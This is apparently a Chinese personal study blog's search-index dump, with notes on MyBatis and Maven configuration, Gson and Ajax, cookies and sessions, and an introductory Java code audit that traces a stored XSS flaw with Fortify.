&lt;&#x2F;resources&gt;&lt;&#x2F;build&gt; 在Mybatis_study也配置一下。再运行还是报错了 1Loading class &#96;com.mysql.jdbc.Driver&#39;. This is deprecated. The new driver class is &#96;com.mysql.cj.jdbc.Driver&#39;. The driver is automatically registered via the SPI and manual loading of the driver class is generally unnecessary. 驱动被废弃了，因此到Mybatis-config.xml中更改driver。之后运行还是错了 1Error querying database. Cause: com.mysql.cj.jdbc.exceptions.CommunicationsException: Communications link failure 参考文章：https://blog.csdn.net/qiushisoftware/article/details/77718634 12set global wait_timeout&#x3D;2000;set global interactive_time&#x3D;2000; 成功后，退出MySQL，重新进入即可。但是运行还是错了。。最后发现是使用在mybatis-config.xml中的url中设置了useSSL=true的问题。如果去掉或者选择useSSL=false，可以运行，但是连接就不安全了。 在url中还可以加上设置时区的 1serverTimezone&#x3D;GMT%2B8 这样运行就可以了","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Mybatis学习1","slug":"Mybatis学习1","permalink":"https://ggyggy666.github.io/tags/Mybatis%E5%AD%A6%E4%B9%A01/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"Maven配置","slug":"Maven配置","date":"2021-06-06T07:08:31.000Z","updated":"2021-06-07T07:33:05.077Z","comments":true,"path":"2021/06/06/Maven配置/","link":"","permalink":"https://ggyggy666.github.io/2021/06/06/Maven%E9%85%8D%E7%BD%AE/","excerpt":"今天终于把信安大赛的事情搞完了，现在有时间就来学习一下ssm, 首先是Maven的配置。","text":"今天终于把信安大赛的事情搞完了，现在有时间就来学习一下ssm, 首先是Maven的配置。 Maven简介之前的JavaWeb学习需要用到某个jar包时，就得到网上去找，然后下载，再将其导入，非常麻烦。而Maven是一个存储有大量jar包的仓库，需要用到什么时，只需要在pom.xml配置文件中写明依赖的jar包，会自动联网下载，无需我们手动下载导入。对项目依赖包管理非常友好。而且，它的目录架构固定，可以用于eclipse或者IDEA，不需要转换。 Maven环境配置按照如下文章配置即可：https://www.yht7.com/news/133245 下载maven，解压，然后将目录下的bin目录路径复制，新建一个环境变量。再在conf目录下的settings.xml中修改本地仓库路径，换成阿里云的源。最后在IDEA中添加maven，找到maven所在的路径即可。 手动创建maven项目首先需要知道maven项目的结构。 新建一个项目Maven01后，该项目下有src目录和一个pom.xml文件； src目录下有main和test目录； 这两个目录下都有java和resources目录； java目录下可以是package的目录，比如是com目录，com目录下有ggy目录，ggy目录下是demo目录，demo目录下是Hello.java。因此这个java文件的开头需要导入package：package com.ggy.demo; resource目录下是一些资源文件。 pom.xml 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt; &lt;groupId&gt;Maven01&lt;&#x2F;groupId&gt; &lt;artifactId&gt;Maven01&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt; &lt;&#x2F;project&gt; 开头是固定的。groupId和artifactId可都写项目名称，版本可以写1.0.0啥的。 Hello.java 1234567package com.ggy.demo;public class Hello &#123; public static void main(String[] args)&#123; System.out.println(&quot;Hello, Maven!&quot;); &#125;&#125; 保存后，在项目的根目录下即Maven01目录下，打开cmd 输入命令：mvn compile, 进行项目的编译，顺利的话会出现success。 之后输入命令：mvn exec:java -Dexec.mainClass=&quot;com.ggy.demo.Hello&quot; 运行后即可看到输出了：Hello, Maven! Maven命令 使用mvn命令，都需要在项目的根目录（即pom.xml所在的目录）下打开cmd。 还支持一些参数 -D：传入属性参数，例如：mvn package -Dmaven.text.skip=true, 打包时跳过单元测试。 -P：使用指定的Profile配置。项目开发一般有多个环境，对应开发(dev)、测试(qa)、预发布(pre)、正式发布(prod)。在pom.xml下的profiles标签中可配置。build标签中的filers中定义了变量配置文件的地址，其中的${env}就是profile中定义的id值。resources是定义哪些目录下的文件会被配置文件中定义的变量替换。maven package -Pdev -Dmaven.test.skip=true, 表示打包本地环境，并跳过单元测试。 IDEA配置Maven File-&gt;other Settings-&gt;Settings for New Project打开后 在导航栏搜maven 如图操作 Maven创建项目创建普通Java项目File-&gt;New-&gt;Project，在弹出的窗口中找到Maven。 选定JDK版本，勾选”Createfrom archetype”, 然后在中间往下划，找到quickstart那一行，选中。下一步，输入项目名Maven02，下一步，完成即可。 打开后，会下载一堆依赖，注意左下角 点击箭头指的即可。下载完成后会出现BUILD SUCCESS。 接着进行项目的配置 compile表示编译命令。也可以改成package打包 确认后，按下启动按钮就是编译了。但是编译失败，出现一堆红线错误。这是因为仓库的地址错误了。因为我们已经改成了阿里云的源，所以需要增加阿里云的仓库。 12345678910111213&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;alimaven&lt;&#x2F;id&gt; &lt;name&gt;aliyun maven&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;&#x2F;enabled&gt; &lt;&#x2F;releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;&#x2F;enabled&gt; &lt;&#x2F;snapshots&gt; &lt;&#x2F;repository&gt; &lt;&#x2F;repositories&gt; 右边有一个maven框，可以拖出来，里面配置了很多maven命令。比如package会在target目录下生成项目的jar或者war包。 创建web项目跟上面差不多。不过选择的是webapp, 要将JDK改为1.8，不然会出很多错。 同样创建好后，配置服务器。 配置服务器因为是web项目，所以肯定需要服务器。可使用Jetty插件或者tomcat插件。在pom.xml中的build标签中加一个plugins标签。 1.Jetty插件 在plugins中增加： 1234567891011121314&lt;plugin&gt; &lt;groupId&gt;org.eclipse.jetty&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jetty-maven-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;9.4.35.v20201120&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;scanIntervalSeconds&gt;10&lt;&#x2F;scanIntervalSeconds&gt; &lt;webApp&gt; &lt;contextPath&gt;&#x2F;&lt;&#x2F;contextPath&gt; &lt;&#x2F;webApp&gt; &lt;httpConnector&gt; &lt;port&gt;8080&lt;&#x2F;port&gt; &lt;&#x2F;httpConnector&gt; &lt;&#x2F;configuration&gt; &lt;&#x2F;plugin&gt; 然后配置启动环境，即可看到HelloWorld。 Maven仓库分为本地仓库和远程仓库。首先在本地仓库中查找，找不到就到远程仓库中下载。远程仓库有三种：中央仓库、私服和其它公共库。 中央仓库是maven提供的中央仓库，不过部署在国外，下得慢。 12341. http:&#x2F;&#x2F;www.sonatype.org&#x2F;nexus&#x2F;2. http:&#x2F;&#x2F;mvnrepository.com&#x2F; （本人推荐仓库）3. http:&#x2F;&#x2F;repo1.maven.org&#x2F;maven2 私服一些公司内部搭建的仓库，可以在本地仓库中上传jar包到私服中，供局域网内其他人使用。 其它公共仓库一般使用阿里云的源 12345678910111213&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;alimaven&lt;&#x2F;id&gt; &lt;name&gt;aliyun maven&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;&#x2F;enabled&gt; &lt;&#x2F;releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;&#x2F;enabled&gt; &lt;&#x2F;snapshots&gt; &lt;&#x2F;repository&gt; &lt;&#x2F;repositories&gt; Maven配置多模块按照MVC层来创建 创建多模块首先创建一个项目 啥都不用选，直接next 名字就是parent了，然后直接Finish。 在该parent项目下new一个模块 下一步后，填写Name即Maven_Dao，之后直接下一步完成。同理新建一个Maven_service模块。最后是Maven_controller模块，不同的是，选择的是webapp 之后编译器改成1.8 12345&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;&#x2F;project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;&#x2F;maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;&#x2F;maven.compiler.target&gt; &lt;&#x2F;properties&gt; 然后将pluginManager中的内容都删除掉。其它模块也一样。 创建模块间的依赖controller调用service，service调用dao。从尾往后创建。 首先在dao模块中，新建一个dao包，然后创建一个userDao类。 12345public class userDao &#123; public static void testDao()&#123; System.out.println(&quot;userDao test...&quot;); &#125;&#125; 在service模块中，新建一个service包，然后创建一个userService类。 123456public class userService &#123; public static void testService()&#123; System.out.println(&quot;userService test...&quot;); userDao.testDao(); &#125;&#125; 但是，注意调用userDao时，还需要在service模块的pom.xml中配置对dao模块的依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.example&lt;&#x2F;groupId&gt; &lt;artifactId&gt;Maven_Dao&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; 同理，controller模块需要导入对service层的依赖。 12345&lt;dependency&gt; &lt;groupId&gt;org.example&lt;&#x2F;groupId&gt; &lt;artifactId&gt;Maven_service&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; controller模块是接受请求并处理转发的，因此需要引入servlet的api。找依赖需要到：https://mvnrepository.com/中搜索，然后复制最多人用的 1234567&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;javax.servlet&#x2F;javax.servlet-api --&gt;&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;&#x2F;artifactId&gt; &lt;version&gt;4.0.1&lt;&#x2F;version&gt; &lt;scope&gt;provided&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt; 之后在controller模块中创建servlet。注意，这个模块没有Java目录，因此需要手动创建。 然后创建包和类。这里包名默认是org.example了，刚开始创建项目时没改。 然后在函数前加一个注解，这样就不用到web.xml中配置servlet了。Ctrl+O增加service方法 之后调用service 1userService.testService(); 配置tomcat需要到tomcat官网找到其maven plugin。如下,注意是加在controller模块的pom.xml中的build标签中。 12345678910111213&lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.tomcat.maven&lt;&#x2F;groupId&gt; &lt;artifactId&gt;tomcat7-maven-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;2.2&lt;&#x2F;version&gt; &lt;&#x2F;plugin&gt; &lt;configuration&gt; &lt;path&gt;&#x2F;web&lt;&#x2F;path&gt; &lt;!--项目访问路径。当前配置的访问是localhost:9090&#x2F;, 如果配置是&#x2F;aa，则访问路径为localhost:9090&#x2F;aa --&gt; &lt;port&gt;8080&lt;&#x2F;port&gt; &lt;uriEncoding&gt;UTF-8&lt;&#x2F;uriEncoding&gt;&lt;!-- 非必需项 --&gt; &lt;&#x2F;configuration&gt; &lt;&#x2F;plugins&gt; 之后先把parent, dao, service和controller都install一遍 然后配置tomcat启动，注意是controller模块。 完成配置后，从parent-&gt;dao-&gt;service-&gt;controller的顺序都install一遍。成功后，启动tomcat 虽然有些红的信息，但是成功启动了。直接访问链接即可看到HelloWorld。然后访问controller路径即user：http://localhost:8080/web/user 成功！ Maven打包项目减少配置耗费，可以将项目打包成jar包或者war包，之后部署即可。 新建package项目创建maven项目，选择webapp, 然后可以更改包名。 之后默认创建，完成后，选择右下角的Enable xx, 将Pom.xml中的1.7改为1.8，删除掉pluginManagement的内容。 之后创建目录结构，因为没有Java目录和resource目录。 dev表示开发环境、test表示测试环境、product表示生产环境。不同的环境配置是不一样的。如dev中 db.properties 12uname&#x3D;rootupasswd&#x3D;ggy bean.xml中 123&lt;bean&gt; dev&lt;&#x2F;bean&gt; 配置profileprofile标签中可以选择使用哪一个环境。 1234567891011121314151617181920212223242526&lt;profiles&gt; &lt;profile&gt; &lt;id&gt;dev&lt;&#x2F;id&gt; &lt;properties&gt; &lt;env&gt;dev&lt;&#x2F;env&gt; &lt;&#x2F;properties&gt; &lt;!--默认打包dev环境--&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;&#x2F;activeByDefault&gt; &lt;&#x2F;activation&gt; &lt;&#x2F;profile&gt; &lt;profile&gt; &lt;id&gt;test&lt;&#x2F;id&gt; &lt;properties&gt; &lt;env&gt;test&lt;&#x2F;env&gt; &lt;&#x2F;properties&gt; &lt;&#x2F;profile&gt; &lt;profile&gt; &lt;id&gt;product&lt;&#x2F;id&gt; &lt;properties&gt; &lt;env&gt;product&lt;&#x2F;env&gt; &lt;&#x2F;properties&gt; &lt;&#x2F;profile&gt;&lt;&#x2F;profiles&gt; 资源文件配置需要放在build中。 1234567891011121314&lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;resources&#x2F;$&#123;env&#125;&lt;&#x2F;directory&gt; &lt;&#x2F;resource&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;java&lt;&#x2F;directory&gt; &lt;includes&gt; &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt; &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt; &lt;include&gt;**&#x2F;*.tld&lt;&#x2F;include&gt; &lt;&#x2F;includes&gt; &lt;filtering&gt;false&lt;&#x2F;filtering&gt; &lt;&#x2F;resource&gt;&lt;&#x2F;resources&gt; 打包首先配置，可以先配置package，打包后生成一个target目录 打开war包所在目录，然后将war包使用bandzip打开 可以发现默认打包的确实是dev环境。然后要把这个bandzip程序关闭，不然后面就会出错！ 指定打包 1clean compile package -Ptest -Dmaven.test.skip&#x3D;true -P指定打包test环境，-Dmaven.test.skip=true表示不打包测试的代码。 Maven的war包部署部署在tomcat上。 将Maven_package.war包复制到tomcat目录的web apps目录下，然后在conf目录下的server.xml中，搜索&lt;Host, 找到后将一句话添加进去 1&lt;Context path&#x3D;&quot;&#x2F;&quot; docBase&#x3D;&quot;Maven_package.war&quot; debug&#x3D;&quot;0&quot; previledge&#x3D;&quot;true&quot; reloadable&#x3D;&quot;true&quot;&#x2F;&gt; 保存后，运行tomcat/bin目录下的startup.bat，之后访问：http://localhost:8080/Maven_package/即可。","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Maven配置","slug":"Maven配置","permalink":"https://ggyggy666.github.io/tags/Maven%E9%85%8D%E7%BD%AE/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"Java代码审计(1)","slug":"Java代码审计-1","date":"2021-06-01T02:24:18.000Z","updated":"2021-06-06T07:04:28.029Z","comments":true,"path":"2021/06/01/Java代码审计-1/","link":"","permalink":"https://ggyggy666.github.io/2021/06/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/","excerpt":"学习了JavaWeb，了解到了一些常用的Java Web知识，今天开始入门Java代码审计。","text":"学习了JavaWeb，了解到了一些常用的Java Web知识，今天开始入门Java代码审计。 前置知识Java内置对象request, response, pageContext, session, application, out, config, page, exception。 九大内置对象，无需声明直接使用。 危险函数 getParameter(): 获取参数的值 getcookies(): 获取cookie getQueryString(): 获取查询字符串 getheaders(): 获取头部 Runtime.exec(): 执行命令 logger.info(): 记录日志信息 危险功能点： password: 密码相关功能 upload: 上传功能 download: 下载功能 fortify的使用安装好后，找到Audit Workbench, 打开后，选择要扫描的Java项目代码，然后等待一会分析时间，最后打开是： 左边上半部分是扫描出来存在漏洞的类型以及所在的文件位置。左下半部分是该漏洞形成涉及到的代码文件，从上到下一步步形成。中间部分就是代码文件显示了，中下部分有多个功能，details描述了该漏洞形成的可能情况，Recommendations描述了怎么防御该漏洞，Diagram则是漏洞形成的流程图，可以看到漏洞一步步的形成过程。右边是项目的包及其类。可以点击它来查看类的代码。 第一步首先查看web.xml中的配置。看一下Filter标签，看用了什么架构，session的超时机制配置了多长时间不活动session就会过期，还有有没有写自己的过滤器，如果没有，说明前端代码可以直接传到后端。 第二步点击左边上半部分扫描出来的漏洞所在代码文件，可以看到漏洞最终出现的位置，然后在左边下半部分中从下面一直往上，逆推查看漏洞的形成链，必要时，点击中间下半部分的Diagram看漏洞形成流程图，再加上点击右边的类文件查看代码，慢慢跟踪。最后再顺序下来理清漏洞形成过程。 XSS漏洞审计首先扫描出漏洞后，点击其中一个xss漏洞 可以看到，这里直接使用EL表达式将对象m的getName()函数返回值输出在JSP页面中。然后从下往上跟踪 发现m是遍历的msginfo列表中的一个对象，而msginfo又是从request域中键为msg的列表获得的。继续往上跟踪一下，看看这个msg键值对是怎么保存在request域中的。 跳到了ShowServlet.java文件中，可以看到是直接将一个msg列表存储到request域中的。而这个msg列表是调用了msginfo中的MessageInfoShowService函数。这个msginfo是MessageInfoServiceImpl的一个对象。也就是说，这个msg是MessageInfoServiceImpl类中的MessageInfoShowService函数返回的一个列表。继续往上跟踪这个MessageInfoServiceImpl类。 可以发现，这个返回的msg列表是调用的msginfo中的MessageInfoShowDao函数返回得到的，而这个msginfo又是MessageInfoDaoImpl这个类的对象。因此，这个msg实际上是MessageInfoDaoImpl这个类中的MessageInfoShowDao函数返回得到的。那么跟踪一下MessageInfoDaoImpl类。 这里由于代码太长没显示完全，这个函数最后确实是返回了一个列表。return messageinfo;。那么看一下这个messageinfo是怎么创建的。 首先是连接数据库后，对查询message表中数据的SQL语句进行预编译，然后执行。创建一个messageinfo列表，然后rs-&gt;next为查询出来的数据，先通过new 一个MessageInfo对象，将查询出来的数据赋值初始化这个对象，然后将这个对象加入mesageinfo中。因此，messageinfo存储了多个MessageInfo对象，这些对象的初始化值都是直接从数据库中查询得到的。 因此可以理清一下思路： 在MessageInfoDaoImpl这个类中的MessageInfoShowDao函数, 查询数据库中的message表的数据，然后用它们去实例化MessageInfo对象，再将这些对象存储进messageinfo中，并将这个列表返回。 MessageInfoServiceImpl中的MessageInfoShowService调用了第一步的函数，得到其返回值messageinfo列表，赋值给msg。 ShowServlet中的ShowMessage函数调用第2步中的函数得到其返回值msg列表，然后将这个msg列表存储进request域中。 JSP页面中直接获取request域中的msg列表，然后遍历该列表获得里面的每个对象，然后获取对象里面的getName函数将name值直接输出。 因此，整个过程中，对xss都没有进行过滤。只要将恶意代码作为name值存进数据库中，那么在message.jsp页面就会将Name值即恶意代码直接输出，从而造成了XSS。 还有一个反射型xss 直接获得输入进来的参数，然后直接输出。","categories":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"https://ggyggy666.github.io/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"Java代码审计(1)","slug":"Java代码审计-1","permalink":"https://ggyggy666.github.io/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/"}],"keywords":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"https://ggyggy666.github.io/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"JavaWeb学习(9)","slug":"JavaWeb学习-9","date":"2021-05-31T07:16:14.000Z","updated":"2021-05-31T10:49:47.114Z","comments":true,"path":"2021/05/31/JavaWeb学习-9/","link":"","permalink":"https://ggyggy666.github.io/2021/05/31/JavaWeb%E5%AD%A6%E4%B9%A0-9/","excerpt":"今天学习JavaWeb的JSON和AJAX。","text":"今天学习JavaWeb的JSON和AJAX。 JSONJSON是客户端与服务器之间进行数据交换的一种格式。它使用的是大括号，然后里面是键值对，每个键值对之间使用,分割。 在JavaSctipt中首先新建一个新的模块Json_Ajax, 然后在web目录下新建一个json.html。 1234567891011121314151617var JsonObj &#x3D; &#123; &quot;key1&quot;:1, &quot;key2&quot;:&quot;2&quot;, &quot;key3&quot;:true, &quot;key4&quot;:[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;], &quot;key5&quot;:&#123; &quot;key_1&quot;:11, &quot;key_2&quot;:&quot;12&quot; &#125;, &quot;key6&quot;:[&#123; &quot;key6_1&quot;:61, &quot;key6_2&quot;:&quot;62&quot; &#125;,&#123; &quot;key6_3&quot;:63, &quot;key6_4&quot;:&quot;64&quot; &#125;] &#125; 键都是字符串, 值可以是整数、字符串、数组、JSON对象，数组里面也可以是JSON对象。 访问： 1234JsonObj.key1;JsonObj.key4[0];JsonObj.key5.key_1;JsonObj.key6[0].key6_1; JSON类型是对象。所以可以用点来访问。 JSON对象与字符串转化 123var JsonString &#x3D; JSON.stringify(JsonObj); var Json &#x3D; JSON.parse(JsonString); Json.key_1; JSON.stringify(对象)：将JSON对象转换成字符串。 JSON.parse(字符串)：将JSON字符串转成JSON对象。 在Java中有三种转换。 JavaBean和Json的转换JavaBean其实就是一个类的实例。需要使用到gson-xxx.jar包。在工程目录下新建一个Lib库，将jar包加载进来。然后在src下新建package，新建一个Person类。 Person类里有id和name两个变量，然后生成构造函数、Getter and Setter, toString方法。 之后新建一个JsonTest类 1234567891011public class JsonTest &#123; @Test public void test()&#123; Person person &#x3D; new Person(1, &quot;ggy&quot;); Gson gson &#x3D; new Gson(); String s &#x3D; gson.toJson(person); System.out.println(s); Person person1 &#x3D; gson.fromJson(s, Person.class); System.out.println(person1); &#125;&#125; 注意使用@Test, 会产生一个警告，然后将jUtil加载进来就行了。 首先需要生成Gson对象。 gson.toJson(对象)，将对象转换成Json字符串。 gson.fromJson(Json字符串, 原来的类型)，注意是Person.class。将字符串转换成原来的对象类型。 结果： 12&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;ggy&quot;&#125;Person&#123;id&#x3D;1, name&#x3D;&#39;ggy&#39;&#125; List和Json的转换将List类型转换成Json字符串与上面的一致，但是从Json字符串转成List类型，而且List里面的值是Person类型就不一样了。 首先新建一个test1函数，创建一个List集合，里面值类型是Person对象，然后使用add函数，将实例化后的Person添加进来。 12345678910111213@Test public void test1()&#123; List&lt;Person&gt; list &#x3D; new ArrayList&lt;Person&gt;(); list.add(new Person(1,&quot;ggy&quot;)); list.add(new Person(2, &quot;ggg&quot;)); Gson gson &#x3D; new Gson(); String s &#x3D; gson.toJson(list); System.out.println(s); List&lt;Person&gt; o &#x3D; gson.fromJson(s, new PersonList().getType()); System.out.println(o); &#125; 之后新建一个Gson对象，使用toJson将list转换成Json字符串。但是反过来时，首先需要新建一个类Person List 12public class PersonList extends TypeToken&lt;List&lt;Person&gt;&gt; &#123;&#125; 它只需要继承TypeToken即可，&lt;&gt;里面是list的类型。大括号里面不用写任何东西。TypeToken是Gson.jar包提供的。 之后直接使用fromJson 1List&lt;Person&gt; o &#x3D; gson.fromJson(s, new PersonList().getType()); 类型的话，就需要先new那个PersonList类，然后调用getType方法即可。 Map和JSON的转换跟List差不多 12345678910111213@Test public void test2()&#123; Map&lt;Integer, Person&gt; map &#x3D; new HashMap&lt;&gt;(); map.put(1, new Person(1, &quot;ggy&quot;)); map.put(2, new Person(2, &quot;ggg&quot;)); Gson gson &#x3D; new Gson(); String s &#x3D; gson.toJson(map); System.out.println(s); Map&lt;Integer, Person&gt; o &#x3D; gson.fromJson(s, new PersonMap().getType()); System.out.println(o.get(1)); &#125; 问题每次要将JSON转成List或者Map时，都要新建一个类去继承TypeToken, 因此可以使用匿名类： 1Map&lt;Integer, Person&gt; o &#x3D; gson.fromJson(s, new TypeToken&lt;Map&lt;Integer, Person&gt;&gt;()&#123;&#125;.getType()); 直接newTypeToken，(){}必不可少。 AjaxAjax，浏览器通过js异步发起请求，局部动态更新页面。 原生JS使用首先新建一个html文件。有一个按钮和一个div标签，点击按钮就调用ajax函数，发起一个ajax请求，然后将获得的返回数据输出到div标签中。 因为客户端与服务器交换的数据类型是JSON的，因此接收到之后，使用JSON.parse将其变为JSON对象，然后访问里面的键即可。 服务器端，新建一个AjaxServlet 自己创建一个JSON字符串，然后返回。本来是想用创建一个Person对象，然后使用Gson将其转换成JSON字符串的，但是不知为什么没有办法将转换之后的JSON字符串输出来。。。 JQuery使用1.$.ajax 方法 url: 请求的地址 type: 请求的类型，GET、POST data: 发送的数据，可以有两种格式：name=value&amp;name=value, 或者：{key：value} success: 请求成功，响应的回调函数。 dataType: 响应的数据类型：text, 纯文本；xml，xml数据；json，json对象。 123456789$.ajax(&#123; url: xxx, type: GET, data: name&#x3D;value, success: function(data)&#123; &#x2F;&#x2F;函数必须有个参数，表示返回来的东西。 alert(data); &#125;, dataType: json,&#125;) 2.$.get方法和$.post方法 有四个参数，url, data, success, dataType。已经封装好了，直接传值即可。 12$.get(url, data, success, type);$.get(&quot;http:&#x2F;&#x2F;xxx&quot;, &quot;name&#x3D;value&quot;, &quot;function(data)&#123;alert(data);&#125;&quot;, &quot;text&quot;); post也一样。 3.getJSON方法 get请求，返回JSON对象，因此只有三个参数了。url, data, success。 12$.getJSON(url, data, success);$.getJSON(&quot;http:&#x2F;&#x2F;xxx&quot;, &quot;name&#x3D;value&quot;, &quot;function(data)&#123;alert(data);&#125;&quot;) 3.serialize方法 上面的data传的都是自己写固定的值，如果需要获取表单中的所有提交的键值对并拼接成name=value&amp;name2=value2，就需要使用serialize方法。 表单的id为form1 12data &#x3D; $&#123;&quot;#form1&quot;&#125;.serialize()即可得到。$.getJSON(&quot;http:&#x2F;&#x2F;xxx&quot;, &quot;name&#x3D;value&amp;&quot;+data, &quot;function()&#123;&#125;&quot;)","categories":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}],"tags":[{"name":"JavaWeb学习","slug":"JavaWeb学习","permalink":"https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}]},{"title":"JavaWeb学习(8)","slug":"JavaWeb学习-8","date":"2021-05-16T02:55:31.000Z","updated":"2021-05-31T05:11:07.057Z","comments":true,"path":"2021/05/16/JavaWeb学习-8/","link":"","permalink":"https://ggyggy666.github.io/2021/05/16/JavaWeb%E5%AD%A6%E4%B9%A0-8/","excerpt":"今天学习Cookie和Session和Filter过滤器。","text":"今天学习Cookie和Session和Filter过滤器。 CookieCookie是服务器发送给客户端保存的一组组键值对，客户端传输数据给服务端时都要带上cookie，用来标识客户端。cookie大小不能超过4KB。 创建Cookie首先创建CreateCookie类，doGet方法中： 123456String action &#x3D; req.getParameter(&quot;action&quot;);if (&quot;createCookie&quot;.equals(action))&#123; Cookie cookie &#x3D; new Cookie(&quot;key1&quot;, &quot;value1&quot;); resp.addCookie(cookie); resp.getWriter().write(&quot;Success!&quot;); &#125; 注意，字符串判断相等使用equals函数，不要直接使用==，不然没办法判断相等。 然后创建一个Cookie.jsp，里面写上一个a标签跳转 1&lt;a href&#x3D;&quot;cookie?action&#x3D;createCookie&quot;&gt;创建Cookie&lt;&#x2F;a&gt; 在web.xml里面配置CreateCookie类的路径是/cookie，重新部署，访问jsp。 服务端获取Cookiecookie保存在客户端，每次发送请求都会发送cookie。服务器获取cookie： 123456else if(&quot;getCookie&quot;.equals(action))&#123; Cookie[] cookies &#x3D; req.getCookies(); for(Cookie cookie : cookies)&#123; resp.getWriter().write(&quot;Key: &quot;+cookie.getName()+&quot;, value: &quot;+cookie.getValue()); &#125; &#125; 只能通过req对象的getCookies方法获取Cookie数组，而不能获得某个Cookie的键值对。也不能通过某个Key获得相应的值。jsp页面中加一个a标签： 1&lt;a href&#x3D;&quot;cookie?action&#x3D;getCookie&quot;&gt;获取Cookie&lt;&#x2F;a&gt; 修改Cookie修改Cookie也很简单，只需要重新new 一个相同key的Cookie对象，值改为新值，然后添加进Cookie即可。 1234else if(&quot;updateCookie&quot;.equals(action))&#123; Cookie cookie &#x3D; new Cookie(&quot;key1&quot;, &quot;ggy&quot;); resp.addCookie(cookie); &#125; 然后jsp中增加a标签： 1&lt;a href&#x3D;&quot;cookie?action&#x3D;updateCookie&quot;&gt;修改Cookie&lt;&#x2F;a&gt; 访问jsp页面，点击即可。 Cookie存活时间先获取cookie对象，然后使用setMaxAge方法设置存活时间。 正数：表示Cookie在多少秒后销毁。 -1：表示浏览器关闭就销毁，因此显示是session。 0：表示马上销毁 默认是-1. 123Cookie cookie &#x3D; new Cookie(&quot;key1&quot;, &quot;ggy&quot;); cookie.setMaxAge(-1); resp.addCookie(cookie); Cookie的path属性可以过滤哪些cookie可以发送给服务器 要符合path路径。 123Cookie cookie &#x3D; new Cookie(&quot;key1&quot;, &quot;ggy&quot;);cookie.setPath(req.getContextPath()+&quot;&#x2F;abc&quot;);resp.addCookie(cookie); req.getContextPath()可以获得当前工程路径，后面加了个/abc, 说明Cookie必须在访问/工程路径/abc下的页面时才会发送。 SessionSession保存在服务器，用来保存客户端的状态，一个客户端一个Session。 创建和获取Session1234567HttpSession session &#x3D; req.getSession();boolean aNew &#x3D; session.isNew();if(aNew)&#123;System.out.println(&quot;Session is New&quot;);&#125;String id &#x3D; session.getId();System.out.println(id); 